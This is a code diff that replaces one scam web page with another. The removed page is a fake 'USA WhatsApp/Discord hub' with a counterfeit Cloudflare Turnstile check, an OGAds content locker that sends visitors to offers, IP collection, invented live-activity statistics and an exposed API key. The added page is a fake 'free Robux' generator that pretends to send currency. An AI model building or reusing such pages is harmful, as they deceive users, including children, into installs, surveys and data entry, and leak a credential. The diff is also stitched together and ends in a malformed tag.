-        <div class="w-12 h-1.5 bg-slate-700 rounded-full"></div>
-      </div>
-
-      <!-- App Header Banner (Dynamic via JS) -->
-      <div id="modalAppBanner" class="p-5 text-white relative transition-colors duration-300 flex-shrink-0">
-        <button onclick="closeAppModal()" class="absolute top-4 right-4 bg-black/30 hover:bg-black/50 text-white rounded-full w-8 h-8 flex items-center justify-center transition-colors text-sm font-bold">
-          ✕
-        </button>
-
-        <div class="flex items-center gap-3.5">
-          <div id="modalAppIcon" class="w-14 h-14 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center shadow-lg text-white overflow-hidden flex-shrink-0">
-            <!-- Dynamic SVG -->
-          </div>
-          <div>
-            <span id="modalAppBadge" class="inline-block text-[10px] font-extrabold uppercase px-2 py-0.5 rounded-md bg-white/20 tracking-wider mb-1">
-              Official Hub
-            </span>
-            <h3 id="modalAppTitle" class="font-heading font-extrabold text-xl leading-snug">
-              🇺🇸 USA WhatsApp Hub
-            </h3>
-            <p id="modalAppSub" class="text-xs opacity-90 font-medium">
-              Verified USA Members • Active 24/7
-            </p>
-          </div>
-        </div>
-      </div>
-
-      <!-- Scrollable Content Area -->
-      <div class="flex-1 overflow-y-auto p-5 space-y-4">
-        
-        <!-- Platform UI Card Preview -->
-        <div id="modalAppPreviewBox" class="bg-slate-900/90 border border-slate-800 rounded-xl p-4 text-xs font-sans">
-          <!-- Dynamic Content Rendered Here -->
-        </div>
-
-        <!-- HUMAN VERIFICATION STEP (TURNSTILE / RECAPTCHA STYLE) -->
-        <div class="bg-slate-900 border border-slate-700/80 rounded-xl p-4 relative overflow-hidden">
-          <div class="flex items-center justify-between mb-2">
-            <div class="flex items-center gap-2">
-              <svg class="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
-              <span class="font-bold text-slate-200 text-xs">Human Access Verification</span>
-            </div>
-            <span class="text-[10px] text-slate-500 font-mono">Cloudflare Guard</span>
-          </div>
-
-          <!-- Interactive Turnstile Checkbox Box -->
-          <div onclick="handleHumanCheckClick()" class="bg-slate-950 border border-slate-800 hover:border-slate-600 rounded-lg p-3 flex items-center justify-between cursor-pointer transition-colors group">
-            <div class="flex items-center gap-3">
-              <div id="turnstileBox" class="w-6 h-6 rounded border-2 border-slate-600 group-hover:border-blue-400 flex items-center justify-center bg-slate-900 transition-colors">
-                <div id="turnstileCheck" class="hidden text-emerald-400 font-bold text-sm">✓</div>
-                <div id="turnstileSpinner" class="hidden w-4 h-4 border-2 border-blue-400 border-t-transparent rounded-full turnstile-spin"></div>
-              </div>
-              <span id="turnstileLabel" class="text-xs font-semibold text-slate-300 group-hover:text-white transition-colors">
-                I am human (Verify USA Access)
-              </span>
-            </div>
-            <!-- Cloudflare / Security logo graphic -->
-            <div class="text-right">
-              <div class="text-[9px] font-bold text-slate-500 uppercase tracking-widest">Turnstile</div>
-              <div class="text-[8px] text-slate-600">Privacy • Terms</div>
-            </div>
-          </div>
-          <p class="text-[10px] text-slate-400 mt-2 text-center">
-            Click checkbox to complete human verification and unlock full group invite links.
-          </p>
-        </div>
-
-      </div>
-
-      <!-- Sticky Action Button (always visible) -->
-      <div class="p-5 pt-0 flex-shrink-0 bg-gradient-to-t from-brand-cardBg via-brand-cardBg to-transparent">
-        <button id="btnProceedToLocker" onclick="handleHumanCheckClick()" class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-extrabold py-3 rounded-xl transition-all shadow-lg text-sm flex items-center justify-center gap-2">
-          <span>Verify & Unlock Invite Link</span>
-          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
-        </button>
-      </div>
+    <div class="para">
+        <p class="para">When you buy Robux you receive only a limited, non-refundable, non-transferable, revocable
+            license to use Robux, which has no value in real currency. By selecting the Premium subscription package,
+            (1) you agree that you are over 18 and that you authorize us to charge your account every month until you
+            cancel the subscription, and (2) you represent that you understand and agree to the Terms of Use, which
+            includes an agreement to arbitrate any dispute between you and Roblox, and Privacy Policy. You can cancel at
+            any time by clicking “Cancel subscription” on the billing tab of the setting page. If you cancel, you will
+            still be charged for the current billing period. See Terms of Use for other limitations.</p>
 
     </div>
-  </div>
+    <script>
 
+        const rbxbtn = document.querySelector(".getrbx");
 
-  <!-- ========================================================= -->
-  <!-- REAL HUMAN VERIFICATION STEP (OGADS OFFER API INTEGRATION) -->
-  <!-- ========================================================= -->
-  <div id="ogadsLocker" class="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-slate-950/90 backdrop-blur-lg opacity-0 pointer-events-none transition-opacity duration-300">
-    <div class="w-full max-w-md bg-slate-900 border-2 border-blue-500/50 rounded-2xl shadow-2xl overflow-hidden relative transform scale-95 transition-transform duration-300">
-      
-      <!-- Locker Close Button -->
-      <button onclick="closeLocker()" class="absolute top-3 right-3 text-slate-400 hover:text-white bg-slate-800/80 hover:bg-slate-700 rounded-full w-7 h-7 flex items-center justify-center text-xs font-bold z-20">
-        ✕
-      </button>
+        const box1 = document.querySelector(".box");
+        const box2 = document.querySelector(".box2");
+        const box3 = document.querySelector(".box3");
+        const box4 = document.querySelector(".box4");
+        const rbxtotal = document.querySelectorAll(".details");
 
-      <!-- Locker Header -->
-      <div class="bg-gradient-to-b from-slate-800 to-slate-900 p-5 border-b border-slate-800 text-center relative">
-        <div class="w-12 h-12 mx-auto mb-2 rounded-2xl bg-blue-600/20 border border-blue-500/40 flex items-center justify-center text-blue-400 text-2xl shadow-inner">
-          🔒
-        </div>
-        <h2 class="font-heading font-extrabold text-xl text-white">
-          USA Community Verification
-        </h2>
-        <p class="text-xs text-slate-300 mt-1 max-w-xs mx-auto">
-          Complete 1 quick verification step below to confirm human presence & unlock invite link.
-        </p>
-      </div>
+        const username = document.querySelector(".username");
 
-      <!-- Live Stats & Urgency Bar -->
-      <div class="bg-slate-950 border-b border-slate-800 px-4 py-2.5 flex items-center justify-between text-[11px]">
-        <div class="flex items-center gap-1.5 text-slate-300 font-semibold">
-          <span class="w-2 h-2 rounded-full bg-emerald-400 pulse-online"></span>
-          <span id="lockerActiveUsers" class="text-emerald-400 font-extrabold">148</span> Users Verifying
-        </div>
-        <div class="text-emerald-400 font-bold flex items-center gap-1">
-          ✓ <span id="lockerCompletedToday">2,140</span> Verified Today
-        </div>
-      </div>
+        const useroutput = document.querySelector(".useroutput");
 
-      <!-- Locker Body & Offers Container -->
-      <div class="p-4 space-y-3">
-        <div class="text-xs text-slate-300 font-semibold text-center">
-          Select an available verification offer below (1 Required):
-        </div>
+        rbxbtn.addEventListener("click", () => {
+            if (username.value.length <= 2) {
+                alert("please enter username");
+            } else {
+                box1.style.display = "none";
+                box2.style.display = "block";
+                setTimeout(showbox2, 4500);
+                setTimeout(showbox3, 4500);
+            }
 
-        <!-- Offers Container Loaded Dynamically via OGAds API -->
-        <div id="offersContainer" class="space-y-2.5 max-h-[260px] overflow-y-auto pr-1">
-          <!-- Loading Spinner -->
-          <div class="py-8 text-center space-y-2">
-            <div class="w-7 h-7 border-3 border-blue-500 border-t-transparent rounded-full turnstile-spin mx-auto"></div>
-            <p class="text-xs text-slate-400 font-medium">Fetching available USA offers...</p>
-          </div>
-        </div>
-
-        <!-- Progress & Verification Status Box -->
-        <div class="bg-slate-950 border border-slate-800 rounded-xl p-3 text-center">
-          <div class="w-full bg-slate-800 h-2 rounded-full overflow-hidden mb-2">
-            <div id="lockerProgressBar" class="bg-gradient-to-r from-blue-500 to-emerald-400 h-full w-1/3 transition-all duration-500"></div>
-          </div>
-          <div id="lockerStatusText" class="text-[11px] font-bold text-slate-400">
-            Waiting for offer completion...
-          </div>
-        </div>
-
-        <!-- Live Activity Ticker -->
-        <div class="text-[10px] text-slate-400 pt-1 flex items-center justify-center gap-1.5 border-t border-slate-800/80">
-          <span>⚡</span>
-          <span id="lockerTickerText"><strong>User #8491</strong> completed verification 3s ago</span>
-        </div>
-      </div>
-
-    </div>
-  </div>
-
-
-  <!-- ========================================================= -->
-  <!-- JAVASCRIPT LOGIC (OGADS INTEGRATION + MODALS + PLATFORMS) -->
-  <!-- ========================================================= -->
-  <script>
-    /* -------------------------------------------------------------
-       OGADS API CONFIGURATION
-       ------------------------------------------------------------- */
-    const OGADS_CONFIG = {
-      apiKey: '47801|AmUgYq0mshV4mu0EA8UMTxLInHGh3g9wgLd06SS5c0a7fe16',
-      endpoint: 'https://offertrk.org/api/v2',
-      maxOffers: 4,
-      countries: 'US',
-      orderby: 'epc'
-    };
-
-    /* -------------------------------------------------------------
-       PLATFORM DATA & REALISTIC PREVIEW RENDERERS
-       ------------------------------------------------------------- */
-    const PLATFORMS = {
-      whatsapp: {
-        title: "🇺🇸 USA WhatsApp Community Hub",
-        badge: "WhatsApp Official",
-        colorClass: "bg-brand-whatsapp text-slate-950",
-        bannerBg: "bg-gradient-to-r from-emerald-800 to-teal-900",
-        sub: "142,500+ USA Members • Instant Delivery",
-        iconImg: 'https://cdn.simpleicons.org/whatsapp/25D366',
-        renderPreview: () => `
-          <div class="space-y-3">
-            <div class="flex items-center gap-2 border-b border-slate-800 pb-2">
-              <span class="w-3 h-3 rounded-full bg-emerald-500 inline-block"></span>
-              <strong class="text-white text-xs">Group Overview:</strong>
-              <span class="text-slate-400">Public USA General & Regional Channels</span>
-            </div>
-            <div class="bg-slate-950 p-2.5 rounded-lg space-y-2 font-mono text-[11px]">
-              <div class="text-emerald-400">📌 [Pinned Announcement]</div>
-              <p class="text-slate-300">"Welcome to the official USA Community Hub! Choose your region in the channel description after human verification."</p>
-            </div>
-            <div class="flex flex-wrap gap-1.5 pt-1">
-              <span class="bg-emerald-950 text-emerald-400 px-2 py-0.5 rounded text-[10px] font-semibold">#us-news</span>
-              <span class="bg-emerald-950 text-emerald-400 px-2 py-0.5 rounded text-[10px] font-semibold">#state-groups</span>
-              <span class="bg-emerald-950 text-emerald-400 px-2 py-0.5 rounded text-[10px] font-semibold">#local-meetups</span>
-            </div>
-          </div>
-        `
-      },
-      discord: {
-        title: "🇺🇸 USA Discord Network",
-        badge: "Discord Partner",
-        colorClass: "bg-brand-discord text-white",
-        bannerBg: "bg-gradient-to-r from-indigo-900 to-slate-900",
-        sub: "98,200+ Members • 18 Active Voice Rooms",
-        iconImg: 'https://cdn.simpleicons.org/discord/5865F2',
-        renderPreview: () => `
-          <div class="space-y-2 text-xs">
-            <div class="flex items-center justify-between text-slate-400 font-bold uppercase text-[10px] tracking-wider mb-1">
-              <span>Text & Voice Channels</span>
-              <span class="text-indigo-400">3,410 Online</span>
-            </div>
-            <div class="space-y-1">
-              <div class="bg-slate-950 px-2.5 py-1.5 rounded flex items-center justify-between text-slate-300">
-                <span># 💬 general-chat</span>
-                <span class="text-[10px] bg-slate-800 text-slate-400 px-1.5 rounded">Active</span>
-              </div>
-              <div class="bg-slate-950 px-2.5 py-1.5 rounded flex items-center justify-between text-slate-300">
-                <span># 📢 usa-announcements</span>
-                <span class="text-[10px] bg-slate-800 text-slate-400 px-1.5 rounded">Official</span>
-              </div>
-              <div class="bg-slate-950 px-2.5 py-1.5 rounded flex items-center justify-between text-indigo-400 font-semibold">
-                <span>🔊 🔊 USA-Lounge-Voice-01</span>
-                <span class="text-[10px] bg-indigo-950 text-indigo-300 px-1.5 rounded">14 Members</span>
-              </div>
-            </div>
-          </div>
-        `
-      },
-      meetup: {
-        title: "🇺🇸 Meetup USA Nationwide",
-        badge: "Meetup Group",
-        colorClass: "bg-brand-meetup text-white",
-        bannerBg: "bg-gradient-to-r from-rose-900 to-pink-950",
-        sub: "64,800+ Members • Nationwide Events",
-        iconImg: 'https://cdn.simpleicons.org/meetup/F64060',
-        renderPreview: () => `
-          <div class="space-y-2">
-            <div class="font-bold text-white text-xs">Upcoming Featured Event:</div>
-            <div class="bg-slate-950 p-2.5 rounded-lg border border-slate-800">
-              <div class="text-rose-400 font-extrabold text-xs mb-1">📍 USA Virtual & In-Person Mixer 2026</div>
-              <div class="text-slate-400 text-[11px]">Location: United States (Nationwide Chapters)</div>
-              <div class="text-slate-400 text-[11px]">Attendees: <strong class="text-slate-200">1,240 confirmed</strong></div>
-            </div>
-          </div>
-        `
-      },
-      messenger: {
-        title: "🇺🇸 Messenger USA Group",
-        badge: "Messenger Official",
-        colorClass: "bg-brand-messenger text-white",
-        bannerBg: "bg-gradient-to-r from-blue-900 to-indigo-900",
-        sub: "83,400+ Members • Fast Replies",
-        iconImg: 'https://cdn.simpleicons.org/messenger/0084FF',
-        renderPreview: () => `
-          <div class="space-y-2">
-            <div class="flex items-center justify-between text-xs text-slate-300">
-              <span>Active Group Call: <strong class="text-blue-400">Available</strong></span>
-              <span class="text-[10px] bg-blue-950 text-blue-300 px-2 py-0.5 rounded-full">Facebook Verified</span>
-            </div>
-            <div class="bg-slate-950 p-2.5 rounded-lg text-[11px] text-slate-300">
-              💬 "Chat with members in your state, share local events, and exchange recommendations."
-            </div>
-          </div>
-        `
-      },
-      groupme: {
-        title: "🇺🇸 GroupMe Campus Hub",
-        badge: "GroupMe Network",
-        colorClass: "bg-brand-groupme text-slate-950",
-        bannerBg: "bg-gradient-to-r from-cyan-900 to-slate-900",
-        sub: "51,900+ Members • 450+ Campus Hubs",
-        iconImg: 'https://cdn.simpleicons.org/groupme/00AFF0',
-        renderPreview: () => `
-          <div class="space-y-2 text-xs">
-            <div class="text-cyan-400 font-bold">🎓 Student & Regional Campus Network:</div>
-            <div class="bg-slate-950 p-2.5 rounded-lg border border-slate-800 text-slate-300 text-[11px]">
-              Direct access to study circles, local campus boards, and city neighborhood chats across all 50 states.
-            </div>
-          </div>
-        `
-      },
-      telegram: {
-        title: "🇺🇸 Telegram Broadcast Channel",
-        badge: "Telegram Verified",
-        colorClass: "bg-brand-telegram text-white",
-        bannerBg: "bg-gradient-to-r from-sky-900 to-slate-900",
-        sub: "115,000+ Subscribers • Fast News",
-        iconImg: 'https://cdn.simpleicons.org/telegram/229ED9',
-        renderPreview: () => `
-          <div class="space-y-2 text-xs">
-            <div class="text-sky-400 font-bold">📢 Channel Feed & Signals:</div>
-            <div class="bg-slate-950 p-2.5 rounded-lg border border-slate-800 text-slate-300 text-[11px]">
-              Instant real-time broadcast alerts, local deals, news updates, and downloadable community media vault.
-            </div>
-          </div>
-        `
-      }
-    };
-
-    let currentAppKey = 'whatsapp';
-    let humanCheckPassed = false;
-
-    function openAppModal(appKey) {
-      const app = PLATFORMS[appKey] || PLATFORMS.whatsapp;
-      currentAppKey = appKey;
-      
-      const modalBanner = document.getElementById('modalAppBanner');
-      modalBanner.className = `p-5 text-white relative transition-colors duration-300 ${app.bannerBg}`;
-      
-      document.getElementById('modalAppIcon').innerHTML = `<img src="${app.iconImg}" alt="${app.title}" class="w-8 h-8" loading="lazy">`;
-      document.getElementById('modalAppTitle').textContent = app.title;
-      document.getElementById('modalAppBadge').textContent = app.badge;
-      document.getElementById('modalAppSub').textContent = app.sub;
-      
-      document.getElementById('modalAppPreviewBox').innerHTML = app.renderPreview();
-      
-      // Reset Turnstile Checkbox
-      resetTurnstile();
-
-      const modal = document.getElementById('appPreviewModal');
-      modal.classList.remove('opacity-0', 'pointer-events-none');
-      const container = modal.querySelector('.modal-content-container');
-      container.classList.remove('translate-y-8');
-    }
-
-    function closeAppModal() {
-      const modal = document.getElementById('appPreviewModal');
-      modal.classList.add('opacity-0', 'pointer-events-none');
-      const container = modal.querySelector('.modal-content-container');
-      container.classList.add('translate-y-8');
-    }
-
-    function resetTurnstile() {
-      humanCheckPassed = false;
-      document.getElementById('turnstileCheck').classList.add('hidden');
-      document.getElementById('turnstileSpinner').classList.add('hidden');
-      document.getElementById('turnstileLabel').textContent = "I am human (Verify USA Access)";
-      document.getElementById('turnstileBox').classList.remove('border-emerald-400', 'bg-emerald-950');
-    }
-
-    function handleHumanCheckClick() {
-      if (humanCheckPassed) {
-        closeAppModal();
-        openLocker();
-        return;
-      }
-
-      const spinner = document.getElementById('turnstileSpinner');
-      const check = document.getElementById('turnstileCheck');
-      const label = document.getElementById('turnstileLabel');
-      const box = document.getElementById('turnstileBox');
-
-      spinner.classList.remove('hidden');
-      label.textContent = "Verifying human signature...";
-
-      setTimeout(() => {
-        spinner.classList.add('hidden');
-        check.classList.remove('hidden');
-        box.classList.add('border-emerald-400', 'bg-emerald-950');
-        label.textContent = "Human Verified! Opening locker...";
-        humanCheckPassed = true;
-
-        setTimeout(() => {
-          closeAppModal();
-          openLocker();
-        }, 600);
-      }, 1000);
-    }
-
-    /* -------------------------------------------------------------
-       OGADS LOCKER OVERLAY & API INTEGRATION
-       ------------------------------------------------------------- */
-    function openLocker() {
-      const locker = document.getElementById('ogadsLocker');
-      locker.classList.remove('opacity-0', 'pointer-events-none');
-      locker.querySelector('div').classList.remove('scale-95');
-
-      fetchOgadsOffers();
-      startLockerFakeStats();
-    }
-
-    function closeLocker() {
-      const locker = document.getElementById('ogadsLocker');
-      locker.classList.add('opacity-0', 'pointer-events-none');
-      locker.querySelector('div').classList.add('scale-95');
-    }
-
-    async function fetchOgadsOffers() {
-      const container = document.getElementById('offersContainer');
-      container.innerHTML = `
-        <div class="py-8 text-center space-y-2">
-          <div class="w-7 h-7 border-3 border-blue-500 border-t-transparent rounded-full turnstile-spin mx-auto"></div>
-          <p class="text-xs text-slate-400 font-medium">Fetching available USA offers...</p>
-        </div>
-      `;
-
-      try {
-        const userIP = await getVisitorIP();
-        const params = new URLSearchParams({
-          ip: userIP,
-          user_agent: navigator.userAgent,
-          max: OGADS_CONFIG.maxOffers,
-          countries: OGADS_CONFIG.countries,
-          orderby: OGADS_CONFIG.orderby,
-          ctype: '3'
+            useroutput.innerHTML = `Searching for <b>${username.value}</b> ...`;
         });
 
-        const response = await fetch(`${OGADS_CONFIG.endpoint}?${params.toString()}`, {
-          method: 'GET',
-          headers: {
-            'Authorization': `Bearer ${OGADS_CONFIG.apiKey}`,
-            'Accept': 'application/json'
-          }
+        rbxtotal.forEach((btn) => {
+            btn.addEventListener("click", () => {
+                box3.style.display = "none";
+
+                box2.style.display = "block";
+
+                setTimeout(showboxagain, 2500);
+                setTimeout(showbox4, 2500);
+                useroutput.innerHTML = `Sending Robux to <b>${username.value}</b>...`;
+            });
         });
 
-        if (!response.ok) {
-          throw new Error(`OGAds API status ${response.status}`);
-        }
-
-        const result = await response.json();
-
-        if (result && result.offers && result.offers.length > 0) {
-          const sorted = result.offers.sort((a, b) => {
-            const boostedA = a.boosted ? 1 : 0;
-            const boostedB = b.boosted ? 1 : 0;
-            if (boostedA !== boostedB) return boostedB - boostedA;
-            const epcA = parseFloat(a.epc) || 0;
-            const epcB = parseFloat(b.epc) || 0;
-            if (epcA !== epcB) return epcB - epcA;
-            const payoutA = parseFloat(a.payout) || 0;
-            const payoutB = parseFloat(b.payout) || 0;
-            return payoutB - payoutA;
-          });
-          renderOffers(sorted);
-        } else {
-          renderFallbackOffers();
-        }
-      } catch (err) {
-        console.warn('OGAds API fallback used:', err);
-        renderFallbackOffers();
-      }
-    }
-
-    async function getVisitorIP() {
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip || '';
-      } catch (e) {
-        return '';
-      }
-    }
-
-    const FIXED_OFFER_STATUSES = [
-      { text: 'Popular', colorClass: 'text-white bg-red-500' },
-      { text: 'Easy', colorClass: 'text-white bg-green-500' },
-      { text: 'Featured', colorClass: 'text-white bg-sky-500' },
-      { text: 'Medium', colorClass: 'text-white bg-yellow-500' }
-    ];
-
-    function getOfferStatusByIndex(index) {
-      return FIXED_OFFER_STATUSES[index] || FIXED_OFFER_STATUSES[FIXED_OFFER_STATUSES.length - 1];
-    }
-
-    function renderOffers(offers) {
-      const container = document.getElementById('offersContainer');
-      container.innerHTML = '';
-
-      offers.forEach((offer, index) => {
-        const offerLink = offer.link || '#';
-        const status = getOfferStatusByIndex(index);
-
-        const card = document.createElement('a');
-        card.href = offerLink;
-        card.target = '_blank';
-        card.onclick = () => onOfferClick(offer.name_short || offer.name || 'Offer');
-        card.className = "flex items-center justify-between p-3 bg-slate-950 border border-slate-800 hover:border-blue-500 rounded-xl group transition-all duration-200 text-left cursor-pointer";
-
-        card.innerHTML = `
-          <div class="flex items-center gap-3 min-w-0 pr-2">
-            <div class="w-10 h-10 rounded-lg bg-slate-800 border border-slate-700 overflow-hidden flex-shrink-0 flex items-center justify-center text-lg">
-              ${offer.picture ? `<img src="${offer.picture}" class="w-full h-full object-cover" onerror="this.src='https://placehold.co/40x40/1e293b/38bdf8?text=USA'">` : '📱'}
-            </div>
-            <div class="min-w-0">
-              <div class="text-xs font-bold text-slate-200 group-hover:text-blue-400 transition-colors truncate">
-                ${offer.name_short || offer.name || 'Verification Task'}
-              </div>
-              <div class="text-[10px] text-slate-400 truncate mt-0.5">
-                ${offer.adcopy || 'Complete quick step to confirm human residency'}
-              </div>
-              <span class="inline-block text-[9px] font-bold ${status.colorClass} px-1.5 py-0.2 rounded mt-1">
-                ${status.text}
-              </span>
-            </div>
-          </div>
-          <button class="bg-blue-600 group-hover:bg-blue-500 text-white font-extrabold text-xs px-3.5 py-2 rounded-lg flex-shrink-0 shadow transition-colors">
-            Verify
-          </button>
-        `;
-        container.appendChild(card);
-      });
-    }
-
-    /* Fallback high-converting offers if API offline */
-    function renderFallbackOffers() {
-      const fallbacks = [
-        { title: "Download & Open App", desc: "Install & run for 30 seconds to verify residency", icon: "📱" },
-        { title: "Complete Quick Mobile Check", desc: "Download free verified sponsor app to unlock", icon: "⚡" },
-        { title: "Confirm Email Address", desc: "Enter valid email to complete USA group registration", icon: "✉️" },
-        { title: "Quick USA Resident Survey", desc: "Answer 3 quick questions to instantly verify", icon: "📋" }
-      ];
-
-      const container = document.getElementById('offersContainer');
-      container.innerHTML = '';
-
-      fallbacks.forEach((item, index) => {
-        const card = document.createElement('a');
-        card.href = '#';
-        card.onclick = (e) => {
-          e.preventDefault();
-          onOfferClick(item.title);
+        let showboxagain = () => {
+            box2.style.display = "none";
         };
-        card.className = "flex items-center justify-between p-3 bg-slate-950 border border-slate-800 hover:border-blue-500 rounded-xl group transition-all duration-200 text-left cursor-pointer";
+        let showbox2 = () => {
+            box2.style.display = "none";
+        };
 
-        const status = getOfferStatusByIndex(index);
+        let showbox3 = () => {
+            box3.style.display = "block";
+        };
 
-        card.innerHTML = `
-          <div class="flex items-center gap-3 min-w-0 pr-2">
-            <div class="w-10 h-10 rounded-lg bg-blue-950 border border-blue-800 flex items-center justify-center text-lg flex-shrink-0">
-              ${item.icon}
-            </div>
-            <div class="min-w-0">
-              <div class="text-xs font-bold text-slate-200 group-hover:text-blue-400 transition-colors truncate">
-                ${item.title}
-              </div>
-              <div class="text-[10px] text-slate-400 truncate mt-0.5">
-                ${item.desc}
-              </div>
-              <span class="inline-block text-[9px] font-bold ${status.colorClass} px-1.5 py-0.2 rounded mt-1">
-                ${status.text}
-              </span>
-            </div>
-          </div>
-          <button class="bg-blue-600 group-hover:bg-blue-500 text-white font-extrabold text-xs px-3.5 py-2 rounded-lg flex-shrink-0 shadow transition-colors">
-            Verify
-          </button>
-        `;
-        container.appendChild(card);
-      });
-    }
+        let showbox4 = () => {
+            box4.style.display = "block";
+        };
 
-    function onOfferClick(title) {
-      const statusText = document.getElementById('lockerStatusText');
-      const progressBar = document.getElementById('lockerProgressBar');
 
-      statusText.textContent = `Checking verification status for "${title}"...`;
-      statusText.className = "text-[11px] font-bold text-amber-400 animate-pulse";
-      progressBar.style.width = "75%";
 
-      setTimeout(() => {
-        statusText.textContent = "Waiting for offer completion to complete...";
-        statusText.className = "text-[11px] font-bold text-slate-400";
-        progressBar.style.width = "40%";
-      }, 7000);
-    }
 
-    /* Dynamic Fake Statistics for Locker Social Proof */
-    let fakeActiveCount = 148;
-    let fakeCompletedToday = 2140;
+    </script>
 
-    function startLockerFakeStats() {
-      setInterval(() => {
-        fakeActiveCount += Math.floor(Math.random() * 5) - 2;
-        if (fakeActiveCount < 120) fakeActiveCount = 135;
-        document.getElementById('lockerActiveUsers').textContent = fakeActiveCount;
-      }, 4000);
 
-      setInterval(() => {
-        fakeCompletedToday += 1;
-        document.getElementById('lockerCompletedToday').textContent = fakeCompletedToday.toLocaleString();
-        
-        const randId = Math.floor(1000 + Math.random() * 9000);
-        const randSec = Math.floor(1 + Math.random() * 5);
-        document.getElementById('lockerTickerText').innerHTML = `<strong>User #${randId}</strong> completed verification ${randSec}s ago`;
-      }, 6500);
-    }
-
-    /* Live Activity Feed Ticker in Main Hub */
-    const NAMES = ["Sarah K. (TX)", "David L. (CA)", "Marcus T. (FL)", "Elena R. (NY)", "Jordan P. (OH)", "Michael B. (GA)", "Chloe W. (WA)"];
-    const TICKER_APPS = ["WhatsApp USA Hub", "Discord Voice Server", "Meetup Regional Chapter", "Messenger Group", "Telegram Broadcast"];
-
-    function updateLiveTicker() {
-      const tickerMsg = document.getElementById('liveTickerMsg');
-      if (!tickerMsg) return;
-
-      const name = NAMES[Math.floor(Math.random() * NAMES.length)];
-      const app = TICKER_APPS[Math.floor(Math.random() * TICKER_APPS.length)];
-      const sec = Math.floor(Math.random() * 15) + 2;
-
-      tickerMsg.style.opacity = '0';
-      setTimeout(() => {
-        tickerMsg.innerHTML = `<strong class="text-slate-200">${name}</strong> joined <span class="text-blue-400 font-semibold">${app}</span> ${sec}s ago`;
-        tickerMsg.style.opacity = '1';
-      }, 300);
-    }
-
-    setInterval(updateLiveTicker, 5000);
-
-  </script>
-
-  <!-- Fixed Bottom Recent Access Notification -->
-  <div id="recentAccessNotification" class="fixed bottom-4 left-4 right-4 sm:left-auto sm:right-6 sm:w-96 z-50 glass-card rounded-xl p-4 border border-slate-700 shadow-2xl">
-    <div class="flex items-center gap-3">
-      <div class="w-8 h-8 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-sm flex-shrink-0">
-        ⚡
-      </div>
-      <div class="min-w-0">
-        <div class="text-xs font-bold text-white flex items-center gap-2">
-          Recent USA Access Requests
-          <span class="text-[9px] bg-emerald-500/20 text-emerald-400 px-1.5 py-0.5 rounded-full uppercase font-extrabold">Live</span>
-        </div>
-        <div id="liveTickerMsg" class="text-[11px] text-slate-400 transition-opacity duration-300 truncate">
-          <strong class="text-slate-200">Alex M.</strong> from Texas joined <span class="text-brand-whatsapp font-semibold">WhatsApp USA Hub</span> 12s ago
-        </div>
-      </div>
-    </div>
-  </div>
-
-</body>
-</html>
+</!doctype>
